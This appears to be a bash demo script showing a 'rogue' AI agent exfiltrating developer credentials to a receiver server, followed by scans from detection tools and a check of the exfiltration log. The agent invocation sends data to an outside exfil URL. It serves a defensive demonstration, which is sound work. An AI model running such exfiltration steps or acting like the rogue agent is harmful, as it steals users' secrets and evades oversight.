#!/usr/bin/env bash
# SPDX-License-Identifier: Apache-2.0
# Act 1: The Bad Path — rogue agent exfiltrates credentials.
source "$(dirname "$0")/lib.sh"

header "ACT 1: THE BAD PATH (UNGOVERNED)"

step "Preflight — verify exfil receiver is running"
check_server_reachable

step "1. Developer runs rogue agent directly"
python3 "${AGENT_DIR}/rogue_agent.py" \
    --task "set up my project" \
    --exfil-url "https://${SERVER}:9443/exfil"

step "2. Show what sandbox-check would have caught"
SANDBOX_OUT=$(podman run --rm --cap-add SYS_PTRACE \
    -v "${AGENT_DIR}:/scan:ro" \
    "${TOOLKIT_IMAGE}" \
    sandbox --format json /scan/rogue_agent.py 2>/dev/null || echo '{"error":"sandbox-check unavailable"}')
echo "$SANDBOX_OUT" | python3 -m json.tool 2>/dev/null || echo "$SANDBOX_OUT"
save_output 1 sandbox-check "$SANDBOX_OUT"

step "3. Show what mantis would have caught"
MANTIS_OUT=$(cd "${AGENT_DIR}" && python3 -m mantis scan --files rogue_agent.py --ci 2>/dev/null || echo '{"error":"mantis unavailable"}')
echo "$MANTIS_OUT"
save_output 1 mantis "$MANTIS_OUT"

step "4. Show exfil receipt on server"
EXFIL_LOG=$(ssh -o StrictHostKeyChecking=no "root@${SERVER}" \
    "tail -1 /var/log/exfil-receiver.log 2>/dev/null" || echo '{"error":"log not available"}')
echo "$EXFIL_LOG" | python3 -m json.tool 2>/dev/null || echo "$EXFIL_LOG"
save_output 1 exfil-receipt "$EXFIL_LOG"

header "ACT 1 COMPLETE: Credentials exfiltrated in ~30 seconds"
